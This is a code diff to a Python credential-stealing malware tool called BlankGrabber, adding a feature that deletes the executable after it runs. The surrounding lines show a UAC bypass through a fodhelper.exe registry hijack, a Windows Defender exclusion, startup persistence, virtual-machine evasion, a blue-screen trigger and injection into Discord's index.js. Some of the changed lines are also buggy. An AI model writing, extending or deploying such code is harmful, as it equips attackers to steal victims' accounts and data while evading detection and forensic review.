@@ -35,7 +35,7 @@ PINGME = _config.get('PINGME', True) # Pings @everyone
 VMPROTECT = _config.get('VMPROTECT', True) # Exits if system is found to be VM
 BSOD = _config.get('BSOD', False) # Tries to trigger blue screen if system is VM
 STARTUP = _config.get('STARTUP', True) # Puts the grabber in startup
-HIDE_ITSELF = _config.get('HIDE_ITSELF', True) # Hides the grabber
+DELETE_ITSELF = _config.get('DELETE_ITSELF', True) # Deletes the grabber after use
 MESSAGE_BOX = _config.get('MSGBOX', dict()) # Message box
 CAPTURE_WEBCAM = False # Takes photo from the webcam (causes bugs, use at own risk)
 INJECT_JS = True # Modify discord's index.js
@@ -105,6 +105,15 @@ class system:
         subprocess.run("fodhelper.exe", shell= True, capture_output= True)
         subprocess.run(f"reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1", shell= True, capture_output= True)
         os._exit(0)
+    
+    @staticmethod
+    def deleteSelf():
+        path, frozen = system.getSelf()
+        if frozen:
+            subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(path), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+            os._exit(0)
+        else:
+            os.remove(path)
 
 class utils:
     ERRORLOGS = list()
@@ -1067,7 +1076,7 @@ class BlankGrabber:
 
 if __name__ == '__main__':
     if FROZEN := hasattr(sys, 'frozen'):
-        Thread(target= system.unblockMOTW, args= [sys.executable], daemon= True).start()
+        Thread(target= system.unblockMOTW, args= (sys.executable), daemon= True).start()
 
     if not system.isAdmin():
         system.UACbypass()
@@ -1106,6 +1115,13 @@ if __name__ == '__main__':
         startupfilepath = system.putInStartup()
         system.WDexclude(startupfilepath)
     
-    if not system.isInStartup() and HIDE_ITSELF and FROZEN:
+    if not system.isInStartup() and DELETE_ITSELF and FROZEN:
         subprocess.run(f"attrib +h +s '{system.getSelf()[0]}'", shell= True, capture_output= True)
-    BlankGrabber()
+    try:
+        BlankGrabber()
+        if DELETE_ITSELF and not system.isInStartup():
+            system.deleteSelf()
+
+    except Exception as e:
+        with open(os.path.join(os.getenv('temp', 'syslogs.log')), 'w') as file:
+            file.write(e)
